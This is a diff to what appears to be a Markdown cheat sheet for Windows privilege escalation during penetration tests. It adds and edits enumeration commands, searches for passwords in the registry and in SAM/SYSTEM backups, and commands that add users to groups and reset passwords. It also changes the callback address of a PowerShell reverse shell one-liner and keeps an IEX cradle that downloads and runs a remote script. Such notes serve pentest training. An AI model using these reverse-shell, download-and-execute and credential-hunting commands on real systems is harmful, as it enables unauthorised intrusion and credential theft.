@@ -5,11 +5,38 @@
 ##################################################################
 -->
 
+## Initial Windows Enumeration
+
+#### Get System Info look for Juicy Potato
+
+`systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"`
+
+#### Get User Privileges
+
+`whoami /priv`
+
+#### Show Ports and Connections
+
+`netstat –nao`
+
+#### Look for Passwords
+
+`dir C:\Windows\System32\config\RegBack\SAM`
+
+`dir C:\Windows\System32\config\RegBack\SYSTEM`
+
+<!--
+##################################################################
+##################################################################
+-->
+
 ## Privesc tools
 
 ### Download to Target Box
 
 - [winPEAS](https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe)
+
+- [windowsprivchecker](https://github.com/Tib3rius/windowsprivchecker/blob/master/windowsprivchecker.bat)
 
 ### On Attack Box
 
@@ -90,7 +117,7 @@
 
 `DRIVEQUERY`
 
-### Check these files.
+#### Check these files.
 
 c:\sysprep.inf
 
@@ -103,6 +130,10 @@ c:\unattend.xml
 %WINDIR%\Panther\Unattend\Unattended.xml
 
 %WINDIR%\Panther\Unattended.xml
+
+#### Search for Passwords
+
+`reg query HKLM /f pass /t REG_SZ /s`
 
 <!--
 ##################################################################
@@ -121,7 +152,7 @@ c:\unattend.xml
 
 #### List users in a group
 
-`net localgroup administrator`
+`net localgroup administrators`
 
 #### Show info on specified user
 
@@ -192,7 +223,7 @@ c:\unattend.xml
 #### Powershell Reverse Shell One Liner
 
 ```
-$client = New-Object System.Net.Sockets.TCPClient("192.168.25.31",7777);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+$client = New-Object System.Net.Sockets.TCPClient("192.168.49.203",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
 
 <!--
@@ -245,6 +276,10 @@ Oneliner method to extract wifi passwords from all the access point.
 #### Windows download from web
 
 `IEX(New-Object Net.WebClient).downloadString('http://10.9.3.23/PowerUp.ps1')`
+
+#### Send GET requests using Powershell
+
+`$Resp = Invoke-WebRequest 'http://targeturl' -UseBasicParsing`
 
 #### Use certutil to download from web
 
@@ -320,3 +355,11 @@ Start
 #### Check File Hash
 
 `CertUtil -hashfile <path to file> MD5`
+
+#### Add user to local group
+
+`net localgroup group_name UserLoginName /add
+
+#### Change local users password
+
+`net user loginid newpassword`
